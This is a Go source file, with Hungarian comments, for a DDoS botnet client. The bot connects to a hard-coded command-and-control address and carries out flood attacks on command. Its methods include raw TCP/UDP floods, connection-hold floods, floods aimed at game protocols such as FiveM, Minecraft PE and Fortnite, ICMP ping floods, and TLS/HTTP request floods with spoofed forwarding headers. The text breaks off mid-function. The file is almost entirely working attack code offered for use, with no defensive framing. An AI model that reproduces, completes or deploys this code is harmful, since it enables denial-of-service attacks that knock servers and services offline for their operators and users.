package main

import (
        "bufio"
        "context"
        crand "crypto/rand"
        "crypto/tls"
        "encoding/binary"
        "fmt"
        mrand "math/rand"
        "net"
        "net/url"
        "os"
        "runtime"
        "strconv"
        "strings"
        "sync"
        "sync/atomic"
        "time"
)

// ============================================================
// KONFIGURÁCIÓ
// ============================================================
var ServerIP = "13.140.176.180"
var ServerPort = "9134"

func init() {
        if ip := os.Getenv("SERVER_IP"); ip != "" {
                ServerIP = ip
        }
        if port := os.Getenv("SERVER_PORT"); port != "" {
                ServerPort = port
        }
        runtime.GOMAXPROCS(runtime.NumCPU())
}

// ============================================================
// AKTÍV TÁMADÁSOK
// ============================================================
type activeAttack struct {
        cancel context.CancelFunc
        conns  sync.Map
}

var (
        activeMu      sync.Mutex
        activeAttacks = make(map[string]*activeAttack)
)

func main() {
        for {
                conn, err := net.DialTimeout("tcp", ServerIP+":"+ServerPort, 10*time.Second)
                if err != nil {
                        time.Sleep(5 * time.Second)
                        continue
                }

                if tcpConn, ok := conn.(*net.TCPConn); ok {
                        tcpConn.SetKeepAlive(true)
                        tcpConn.SetKeepAlivePeriod(15 * time.Second)
                        tcpConn.SetNoDelay(true)
                        tcpConn.SetWriteBuffer(256 * 1024)
                        tcpConn.SetReadBuffer(256 * 1024)
                }

                regMsg := fmt.Sprintf("REGISTER %s %s\n", runtime.GOOS, runtime.GOARCH)
                if _, err := conn.Write([]byte(regMsg)); err != nil {
                        conn.Close()
                        time.Sleep(5 * time.Second)
                        continue
                }

                pingStop := make(chan struct{})
                go func(c net.Conn, stop chan struct{}) {
                        defer func() { recover() }()
                        ticker := time.NewTicker(20 * time.Second)
                        defer ticker.Stop()
                        for {
                                select {
                                case <-stop:
                                        return
                                case <-ticker.C:
                                        if _, err := c.Write([]byte("PING\n")); err != nil {
                                                return
                                        }
                                }
                        }
                }(conn, pingStop)

                scanner := bufio.NewScanner(conn)
                scanner.Buffer(make([]byte, 4096), 1024*1024)

                for scanner.Scan() {
                        cmd := scanner.Text()
                        if cmd == "" {
                                continue
                        }

                        parts := strings.Fields(cmd)
                        if len(parts) == 0 {
                                continue
                        }

                        switch parts[0] {
                        case "raw", "hold", "ovhudp", "mix",
                                "hex", "mcpe", "fivem", "discord", "fortnite",
                                "udp", "icmp":
                                if len(parts) >= 4 {
                                        target := parts[1]
                                        port := parts[2]
                                        duration, _ := strconv.Atoi(parts[3])
                                        method := parts[0]
                                        go startAttack(target, method, func(ctx context.Context, att *activeAttack) {
                                                switch method {
                                                case "raw":
                                                        rawFlood(ctx, att, target, port)
                                                case "hold":
                                                        holdFlood(ctx, att, target, port)
                                                case "ovhudp":
                                                        ovhUdpFlood(ctx, att, target, port)
                                                case "mix":
                                                        mixFlood(ctx, att, target, port)
                                                case "hex":
                                                        hexFlood(ctx, att, target, port)
                                                case "mcpe":
                                                        mcpeFlood(ctx, att, target, port)
                                                case "fivem":
                                                        fivemFlood(ctx, att, target, port)
                                                case "discord":
                                                        discordFlood(ctx, att, target, port)
                                                case "fortnite":
                                                        fortniteFlood(ctx, att, target, port)
                                                case "udp":
                                                        udpFlood(ctx, att, target, port)
                                                case "icmp":
                                                        icmpFlood(ctx, att, target, port)
                                                }
                                        }, duration)
                                }
                        case "tls", "tlsplus":
                                if len(parts) >= 3 {
                                        u := parts[1]
                                        duration, _ := strconv.Atoi(parts[2])
                                        method := parts[0]
                                        go startAttack(u, method, func(ctx context.Context, att *activeAttack) {
                                                switch method {
                                                case "tls":
                                                        tlsFlood(ctx, att, u)
                                                case "tlsplus":
                                                        tlsPlusFlood(ctx, att, u)
                                                }
                                        }, duration)
                                }
                        case "xreset":
                                if len(parts) >= 4 {
                                        u := parts[1]
                                        port := parts[2]
                                        duration, _ := strconv.Atoi(parts[3])
                                        go startAttack(u, "xreset", func(ctx context.Context, att *activeAttack) {
                                                xresetFlood(ctx, att, u, port)
                                        }, duration)
                                }
                        case "PING":
                                conn.Write([]byte("PONG\n"))
                        case "stop":
                                if len(parts) >= 2 {
                                        stopAttacksByTarget(parts[1])
                                }
                        }
                }

                close(pingStop)
                conn.Close()
                time.Sleep(5 * time.Second)
        }
}

// ============================================================
// START / STOP
// ============================================================
func startAttack(target, method string, attackFunc func(ctx context.Context, att *activeAttack), duration int) {
        ctx, cancel := context.WithCancel(context.Background())
        key := target + "|" + method

        att := &activeAttack{cancel: cancel}

        activeMu.Lock()
        if old, exists := activeAttacks[key]; exists {
                old.cancel()
                old.conns.Range(func(k, v interface{}) bool {
                        if c, ok := v.(net.Conn); ok {
                                c.Close()
                        }
                        return true
                })
        }
        activeAttacks[key] = att
        activeMu.Unlock()

        if duration > 0 {
                time.AfterFunc(time.Duration(duration)*time.Second, func() {
                        cancel()
                        att.conns.Range(func(k, v interface{}) bool {
                                if c, ok := v.(net.Conn); ok {
                                        c.Close()
                                }
                                return true
                        })
                })
        }

        go func() {
                defer func() {
                        recover()
                        activeMu.Lock()
                        delete(activeAttacks, key)
                        activeMu.Unlock()
                        cancel()
                        att.conns.Range(func(k, v interface{}) bool {
                                if c, ok := v.(net.Conn); ok {
                                        c.Close()
                                }
                                return true
                        })
                }()
                attackFunc(ctx, att)
        }()
}

func normalizeTarget(t string) string {
        t = strings.TrimSpace(t)
        if t == "" {
                return t
        }
        if strings.Contains(t, "://") {
                if u, err := url.Parse(t); err == nil {
                        t = u.Host
                }
        }
        if idx := strings.LastIndex(t, ":"); idx != -1 {
                if _, err := strconv.Atoi(t[idx+1:]); err == nil {
                        t = t[:idx]
                }
        }
        if idx := strings.Index(t, "/"); idx != -1 {
                t = t[:idx]
        }
        return t
}

func stopAttacksByTarget(target string) {
        activeMu.Lock()
        defer activeMu.Unlock()
        normTarget := normalizeTarget(target)
        if normTarget == "" {
                return
        }
        for key, att := range activeAttacks {
                parts := strings.SplitN(key, "|", 2)
                if len(parts) < 1 {
                        continue
                }
                if normalizeTarget(parts[0]) == normTarget {
                        att.cancel()
                        att.conns.Range(func(k, v interface{}) bool {
                                if c, ok := v.(net.Conn); ok {
                                        c.Close()
                                }
                                return true
                        })
                        delete(activeAttacks, key)
                }
        }
}

// ============================================================
// SEGÉD: RANDOM
// ============================================================
var rng = mrand.New(mrand.NewSource(time.Now().UnixNano()))
var rngMu sync.Mutex

func fastRand() uint32 {
        rngMu.Lock()
        v := uint32(rng.Int31())
        rngMu.Unlock()
        return v
}

func randStr(n int) string {
        const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
        b := make([]byte, n)
        for i := range b {
                b[i] = letters[mrand.Intn(len(letters))]
        }
        return string(b)
}

// ============================================================
// L4 - RAW
// ============================================================
func rawFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        payload := make([]byte, 1400)
        crand.Read(payload)
        workers := runtime.NumCPU() * 256
        if workers < 2000 {
                workers = 2000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()
                        dialer := &net.Dialer{Timeout: 3 * time.Second}
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                var conn net.Conn
                                var err error
                                if id%2 == 0 {
                                        conn, err = dialer.DialContext(ctx, "tcp", addr)
                                } else {
                                        conn, err = dialer.DialContext(ctx, "udp", addr)
                                }
                                if err != nil {
                                        select {
                                        case <-ctx.Done():
                                                return
                                        case <-time.After(20 * time.Millisecond):
                                        }
                                        continue
                                }
                                att.conns.Store(conn, conn)
                                for i := 0; i < 5000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        att.conns.Delete(conn)
                                                        conn.Close()
                                                        return
                                                default:
                                                }
                                        }
                                        conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                                att.conns.Delete(conn)
                                conn.Close()
                        }
                }(w)
        }
        wg.Wait()
}

// ============================================================
// L4 - HOLD (TCP Connection Hold Flood)
// ============================================================
func holdFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := net.JoinHostPort(target, port)

        // ~1400 PPS per bot = 700 mikroszekundumonként 1 új TCP kapcsolat
        workers := runtime.NumCPU() * 512
        if workers < 4000 {
                workers = 4000
        }

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()

                        ticker := time.NewTicker(700 * time.Microsecond)
                        defer ticker.Stop()

                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                case <-ticker.C:
                                }

                                dialer := &net.Dialer{Timeout: 2 * time.Second}
                                conn, err := dialer.DialContext(ctx, "tcp", addr)
                                if err != nil {
                                        continue
                                }

                                if tc, ok := conn.(*net.TCPConn); ok {
                                        tc.SetNoDelay(true)
                                        tc.SetKeepAlive(true)
                                        tc.SetKeepAlivePeriod(1 * time.Second)
                                        tc.SetWriteBuffer(1024)
                                }

                                att.conns.Store(conn, conn)

                                // Fenntartjuk a kapcsolatot keepalive-dal
                                go func(c net.Conn) {
                                        defer func() {
                                                att.conns.Delete(c)
                                                c.Close()
                                        }()

                                        buf := make([]byte, 1)
                                        for {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }

                                                c.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
                                                if _, err := c.Write(buf); err != nil {
                                                        return
                                                }

                                                time.Sleep(1 * time.Second)
                                        }
                                }(conn)
                        }
                }()
        }

        wg.Wait()
}

// ============================================================
// L4 - OVH UDP
// ============================================================
func ovhUdpFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        workers := runtime.NumCPU() * 256
        if workers < 2000 {
                workers = 2000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(8 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                size := 512 + mrand.Intn(1024)
                                payload := make([]byte, size)
                                crand.Read(payload)
                                for i := 0; i < 10000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }
                                        }
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                        }
                }(w)
        }
        wg.Wait()
}

// ============================================================
// L4 - MIX
// ============================================================
func mixFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        payload := make([]byte, 1400)
        crand.Read(payload)
        workers := runtime.NumCPU() * 256
        if workers < 2000 {
                workers = 2000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()
                        dialer := &net.Dialer{Timeout: 3 * time.Second}
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                var conn net.Conn
                                var err error
                                if id%3 == 0 {
                                        conn, err = dialer.DialContext(ctx, "tcp", addr)
                                } else {
                                        conn, err = dialer.DialContext(ctx, "udp", addr)
                                }
                                if err != nil {
                                        select {
                                        case <-ctx.Done():
                                                return
                                        case <-time.After(20 * time.Millisecond):
                                        }
                                        continue
                                }
                                att.conns.Store(conn, conn)
                                for i := 0; i < 5000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        att.conns.Delete(conn)
                                                        conn.Close()
                                                        return
                                                default:
                                                }
                                        }
                                        conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                                att.conns.Delete(conn)
                                conn.Close()
                        }
                }(w)
        }
        wg.Wait()
}

// ============================================================
// L4 - HEX
// ============================================================
func hexFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        hexChars := []byte("0123456789ABCDEF")
        workers := runtime.NumCPU() * 256
        if workers < 2000 {
                workers = 2000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(8 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                payload := make([]byte, 1024)
                                for i := range payload {
                                        payload[i] = hexChars[mrand.Intn(len(hexChars))]
                                }
                                for i := 0; i < 10000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }
                                        }
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                        }
                }()
        }
        wg.Wait()
}

// ============================================================
// L4 - MCPE
// ============================================================
func mcpeFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        workers := runtime.NumCPU() * 384
        if workers < 3000 {
                workers = 3000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(8 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                payload := make([]byte, 33)
                                payload[0] = 0x01
                                binary.BigEndian.PutUint64(payload[1:9], uint64(time.Now().UnixNano()/1e6))
                                copy(payload[9:25], []byte{0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78})
                                crand.Read(payload[25:33])
                                for i := 0; i < 10000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }
                                        }
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                        }
                }()
        }
        wg.Wait()
}

// ============================================================
// L4 - FIVEM
// ============================================================
func fivemFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port
        payloads := [][]byte{
                []byte("\xFF\xFF\xFF\xFFgetinfo "),
                []byte("\xFF\xFF\xFF\xFFgetinfo xxx"),
                []byte("\xFF\xFF\xFF\xFFgetinfo fivem"),
                []byte("\xFF\xFF\xFF\xFFgetinfo\n"),
                []byte("\xFF\xFF\xFF\xFFgetinfo roxwood"),
                []byte("\xFF\xFF\xFF\xFFgetinfo 1"),
                []byte("\xFF\xFF\xFF\xFFgetinfo 0"),
                []byte("\xFF\xFF\xFF\xFFgetinfo a"),
                []byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaa"),
                []byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
                []byte("\xFF\xFF\xFF\xFFgetinfo json"),
                []byte("\xFF\xFF\xFF\xFFgetinfo xml"),
                []byte("\xFF\xFF\xFF\xFFgetinfo status"),
                []byte("\xFF\xFF\xFF\xFFgetinfo players"),
                []byte("\xFF\xFF\xFF\xFFgetinfo info"),
                []byte("\xFF\xFF\xFF\xFFgetinfo server"),
                []byte("\xFF\xFF\xFF\xFFgetinfo \xFF\xFF\xFF\xFF"),
                []byte("\xFF\xFF\xFF\xFFgetinfo \x00\x00\x00\x00"),
                []byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
                []byte("\xFF\xFF\xFF\xFFgetinfo " + string(make([]byte, 64))),
        }
        workers := runtime.NumCPU() * 512
        if workers < 6000 {
                workers = 6000
        }
        var wg sync.WaitGroup
        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(8 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        payloadIdx := id % len(payloads)
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                for i := 0; i < 20000; i++ {
                                        if i%100 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }
                                        }
                                        if i%100 == 0 {
                                                payloadIdx = (payloadIdx + 1) % len(payloads)
                                        }
                                        if _, err := conn.Write(payloads[payloadIdx]); err != nil {
                                                break
                                        }
                                }
                        }
                }(w)
        }
        wg.Wait()
}

// ============================================================
// L4 - DISCORD (a discord.txt-ből)
// ============================================================
func discordFlood(ctx context.Context, att *activeAttack, target, port string) {
        workers := 500
        if runtime.NumCPU() > 4 {
                workers = 800
        }
        if runtime.NumCPU() > 8 {
                workers = 1200
        }

        payload := make([]byte, 1472)
        crand.Read(payload)
        addr := net.JoinHostPort(target, port)

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(4 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                for j := 0; j < 100; j++ {
                                        conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
                                        if _, err := conn.Write(payload); err != nil {
                                                return
                                        }
                                }
                        }
                }()
        }

        wg.Wait()
}

// ============================================================
// L4 - FORTNITE (javított)
// ============================================================
func fortniteFlood(ctx context.Context, att *activeAttack, target, port string) {
        addr := target + ":" + port

        workers := 800
        if runtime.NumCPU() > 4 {
                workers = 1200
        }
        if runtime.NumCPU() > 8 {
                workers = 1500
        }

        payloads := make([][]byte, 0, 20)

        p1 := make([]byte, 9)
        p1[0] = 0x02
        binary.BigEndian.PutUint32(p1[1:5], mrand.Uint32())
        binary.BigEndian.PutUint32(p1[5:9], mrand.Uint32())
        payloads = append(payloads, p1)

        p2 := make([]byte, 5)
        p2[0] = 0x00
        binary.BigEndian.PutUint32(p2[1:5], mrand.Uint32())
        payloads = append(payloads, p2)

        p3 := make([]byte, 5)
        p3[0] = 0x03
        binary.BigEndian.PutUint32(p3[1:5], mrand.Uint32())
        payloads = append(payloads, p3)

        for _, size := range []int{32, 64, 128, 256, 512, 768, 1024, 1280, 1400, 1472, 1500} {
                p := make([]byte, size)
                crand.Read(p)
                payloads = append(payloads, p)
        }

        var wg sync.WaitGroup

        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()

                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        defer conn.Close()

                        att.conns.Store(conn, conn)

                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(4 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }

                        payloadIdx := id % len(payloads)

                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }

                                for i := 0; i < 100; i++ {
                                        if i%3 == 0 {
                                                payloadIdx = (payloadIdx + 1) % len(payloads)
                                        }
                                        conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
                                        if _, err := conn.Write(payloads[payloadIdx]); err != nil {
                                                return
                                        }
                                }
                        }
                }(w)
        }

        wg.Wait()
}

// ============================================================
// L4 - UDP (javított - gyors stop)
// ============================================================
func udpFlood(ctx context.Context, att *activeAttack, target, port string) {
        payload := make([]byte, 1472)
        crand.Read(payload)
        addr := net.JoinHostPort(target, port)

        workers := 200
        if runtime.NumCPU() > 4 {
                workers = 400
        }

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        conn, err := net.Dial("udp", addr)
                        if err != nil {
                                return
                        }
                        att.conns.Store(conn, conn)
                        if udpConn, ok := conn.(*net.UDPConn); ok {
                                udpConn.SetWriteBuffer(8 * 1024 * 1024)
                                udpConn.SetReadBuffer(1)
                        }
                        defer func() {
                                att.conns.Delete(conn)
                                conn.Close()
                        }()
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                // Batch: 100 Write, majd újra ellenőrizzük a ctx-et
                                for j := 0; j < 100; j++ {
                                        conn.Write(payload)
                                }
                        }
                }()
        }

        wg.Wait()
}

// ============================================================
// L4 - ICMP (Ping Flood)
// ============================================================
func icmpFlood(ctx context.Context, att *activeAttack, target, port string) {
        // ICMP-hez nyers socket kell (root szükséges)
        // A port paramétert nem használjuk, de a szerver küldi

        workers := runtime.NumCPU() * 256
        if workers < 3000 {
                workers = 3000
        }

        var wg sync.WaitGroup

        for w := 0; w < workers; w++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()

                        conn, err := net.Dial("ip4:icmp", target)
                        if err != nil {
                                return
                        }
                        defer conn.Close()

                        att.conns.Store(conn, conn)

                        // Max ICMP packet: 65535 byte (IP header 20 byte + ICMP)
                        // 8 byte ICMP header + N byte payload
                        packetSize := 65500
                        if packetSize > 65507 {
                                packetSize = 65507
                        }
                        payload := make([]byte, packetSize-8)

                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }

                                packet := make([]byte, packetSize)

                                // ICMP Type = 8 (Echo Request)
                                packet[0] = 8
                                // ICMP Code = 0
                                packet[1] = 0
                                // Checksum = 0 (majd számoljuk)
                                packet[2] = 0
                                packet[3] = 0
                                // Identifier (2 byte)
                                packet[4] = byte(mrand.Intn(256))
                                packet[5] = byte(mrand.Intn(256))
                                // Sequence number (2 byte)
                                packet[6] = byte(mrand.Intn(256))
                                packet[7] = byte(mrand.Intn(256))

                                crand.Read(payload)
                                copy(packet[8:], payload)

                                checksum := icmpChecksum(packet)
                                packet[2] = byte(checksum >> 8)
                                packet[3] = byte(checksum)

                                for j := 0; j < 100000; j++ {
                                        if j%1000 == 0 {
                                                select {
                                                case <-ctx.Done():
                                                        return
                                                default:
                                                }
                                        }
                                        conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
                                        if _, err := conn.Write(packet); err != nil {
                                                break
                                        }
                                }
                        }
                }(w)
        }

        wg.Wait()
}

// icmpChecksum kiszámítja az ICMP packet checksum-át (RFC 1071)
func icmpChecksum(data []byte) uint16 {
        var sum uint32
        length := len(data)
        index := 0

        for length > 1 {
                sum += uint32(data[index])<<8 + uint32(data[index+1])
                index += 2
                length -= 2
        }

        if length > 0 {
                sum += uint32(data[index])
        }

        for (sum >> 16) > 0 {
                sum = (sum & 0xFFFF) + (sum >> 16)
        }

        return uint16(^sum)
}

// ============================================================
// L7 SEGÉD
// ============================================================
var userAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func randomUA() string {
        return userAgents[mrand.Intn(len(userAgents))]
}

// ============================================================
// dialTLSContext
// ============================================================
func dialTLSContext(ctx context.Context, host, serverName string, nextProtos []string) (*tls.Conn, error) {
        dialer := &net.Dialer{
                Timeout:   5 * time.Second,
                KeepAlive: 30 * time.Second,
        }

        rawConn, err := dialer.DialContext(ctx, "tcp", host)
        if err != nil {
                return nil, err
        }

        if tcpConn, ok := rawConn.(*net.TCPConn); ok {
                tcpConn.SetKeepAlive(true)
                tcpConn.SetKeepAlivePeriod(30 * time.Second)
                tcpConn.SetNoDelay(true)
                tcpConn.SetWriteBuffer(512 * 1024)
                tcpConn.SetReadBuffer(512 * 1024)
        }

        tlsConn := tls.Client(rawConn, &tls.Config{
                InsecureSkipVerify: true,
                ServerName:         serverName,
                NextProtos:         nextProtos,
                MinVersion:         tls.VersionTLS12,
                MaxVersion:         tls.VersionTLS13,
        })

        done := make(chan error, 1)
        go func() { done <- tlsConn.Handshake() }()

        select {
        case err := <-done:
                if err != nil {
                        rawConn.Close()
                        return nil, err
                }
        case <-time.After(5 * time.Second):
                rawConn.Close()
                return nil, fmt.Errorf("tls handshake timeout")
        case <-ctx.Done():
                rawConn.Close()
                return nil, ctx.Err()
        }

        return tlsConn, nil
}

// ============================================================
// L7 - TLS (folyamatos küldés)
// ============================================================
func tlsFlood(ctx context.Context, att *activeAttack, rawURL string) {
        u, err := url.Parse(rawURL)
        if err != nil {
                return
        }
        host := u.Host
        if !strings.Contains(host, ":") {
                host += ":443"
        }

        basePayload := fmt.Sprintf(
                "GET %s HTTP/1.1\r\n"+
                        "Host: %s\r\n"+
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"+
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
                        "Accept-Language: en-US,en;q=0.9\r\n"+
                        "Accept-Encoding: gzip, deflate, br\r\n"+
                        "Connection: keep-alive\r\n"+
                        "Cache-Control: no-cache\r\n"+
                        "Pragma: no-cache\r\n"+
                        "Upgrade-Insecure-Requests: 1\r\n"+
                        "Sec-Fetch-Dest: document\r\n"+
                        "Sec-Fetch-Mode: navigate\r\n"+
                        "Sec-Fetch-Site: none\r\n"+
                        "Sec-Fetch-User: ?1\r\n"+
                        "X-Request-ID: %s\r\n"+
                        "X-Forwarded-For: %d.%d.%d.%d\r\n"+
                        "\r\n",
                u.Path, u.Host, randStr(24),
                mrand.Intn(255), mrand.Intn(255), mrand.Intn(255), mrand.Intn(255))
        baseBytes := []byte(basePayload)

        workers := 2000
        if runtime.NumCPU() > 4 {
                workers = 3000
        }
        if runtime.NumCPU() > 8 {
                workers = 4000
        }

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }

                                conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"http/1.1"})
                                if err != nil {
                                        select {
                                        case <-ctx.Done():
                                                return
                                        case <-time.After(10 * time.Millisecond):
                                        }
                                        continue
                                }

                                att.conns.Store(conn, conn)

                                for {
                                        select {
                                        case <-ctx.Done():
                                                att.conns.Delete(conn)
                                                conn.Close()
                                                return
                                        default:
                                        }

                                        conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                                        if _, err := conn.Write(baseBytes); err != nil {
                                                break
                                        }
                                }
                                att.conns.Delete(conn)
                                conn.Close()
                        }
                }()
        }

        wg.Wait()
}

// ============================================================
// L7 - TLSPLUS (folyamatos küldés)
// ============================================================
func tlsPlusFlood(ctx context.Context, att *activeAttack, rawURL string) {
        u, err := url.Parse(rawURL)
        if err != nil {
                return
        }
        host := u.Host
        if !strings.Contains(host, ":") {
                host += ":443"
        }

        generatePayload := func() []byte {
                path := u.Path
                if path == "" {
                        path = "/"
                }
                path += "?" + randStr(16)

                return []byte(fmt.Sprintf(
                        "GET %s HTTP/1.1\r\n"+
                                "Host: %s\r\n"+
                                "User-Agent: %s\r\n"+
                                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
                                "Accept-Encoding: gzip, deflate, br\r\n"+
                                "Accept-Language: en-US,en;q=0.9\r\n"+
                                "Connection: keep-alive\r\n"+
                                "Cache-Control: no-cache\r\n"+
                                "Pragma: no-cache\r\n"+
                                "Upgrade-Insecure-Requests: 1\r\n"+
                                "Sec-Fetch-Dest: document\r\n"+
                                "Sec-Fetch-Mode: navigate\r\n"+
                                "Sec-Fetch-Site: none\r\n"+
                                "Sec-Fetch-User: ?1\r\n"+
                                "X-Request-ID: %s\r\n"+
                                "X-Forwarded-For: %d.%d.%d.%d\r\n"+
                                "X-Real-IP: %d.%d.%d.%d\r\n"+
                                "Referer: https://%s/\r\n"+
                                "\r\n",
                        path, u.Host, randomUA(), randStr(24),
                        mrand.Intn(255), mrand.Intn(255), mrand.Intn(255), mrand.Intn(255),
                        mrand.Intn(255), mrand.Intn(255), mrand.Intn(255), mrand.Intn(255),
                        u.Host))
        }

        workers := 3000
